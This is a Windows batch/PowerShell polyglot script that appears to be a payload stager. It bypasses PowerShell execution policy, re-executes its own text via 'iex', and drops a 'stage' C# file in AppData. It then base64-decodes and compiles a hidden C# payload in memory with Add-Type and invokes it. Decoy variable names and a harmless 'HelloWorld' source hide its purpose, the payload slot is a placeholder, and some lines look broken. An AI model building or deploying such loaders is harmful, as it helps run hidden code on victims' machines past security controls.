<# : batch portion (begins PowerShell multi-line comment block)


@echo off & setlocal
set "POWERSHELL_BAT_ARGS=%*"

echo ---- FROM BATCH
start cmd /c powershell.exe -ExecutionPolicy Bypass -noprofile -NoLogo -Command "iex (${%~f0} | out-string)"
sleep 2
; seem to be error with script OW
powershell.exe -ExecutionPolicy Bypass -noprofile -NoLogo -Command "$horse=""echo hi; start-sleep 10""; $horse | set-content -Force -Path $env:APPdata\junkstuff2\csharp_stage.cs; start-sleep 3;" 
exit /b %errorlevel%
; see https://stackoverflow.com/a/33065387 and https://stackoverflow.com/a/41195176 for source of this script original OW
: end batch / begin PowerShell chimera #>


$VAR = "---- FROM POWERSHELL";
$VAR;
$POWERSHELL_BAT_ARGS=$env:POWERSHELL_BAT_ARGS
$POWERSHELL_BAT_ARGS
# not sure point of this TJ
$nascar = @"
using System;
namespace HelloWorld
{
	public class Program
	{
		public static void Main(){
			Console.WriteLine("database.exe!");
		}
	}
}
"@

$f15 = "<insert csharp as base64>"


mkdir -Force $env:AppDatA\junkstuff2
$nascar | Set-Content -Force -Path $env:AppDATA\junkstuff2\csharp_stage.cs
# give it some time to sync OW
start-sleep 3
$source = Get-Content -Path $env:APPdata\junkstuff2\csharp_stage.cs -Raw
start-sleep 1
if ($source -ne "echo hi") {
$source = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($f15))
}
Add-Type -TypeDefinition "$source"
if (($POWERSHELL_BAT_ARGS + "") -ne "")
{
$data = @($pwd, $POWERSHELL_BAT_ARGS)}
else {$data = @($pwd)}
[HelloWorld.ILoveCSharp]::Function($data)
Start-Sleep 1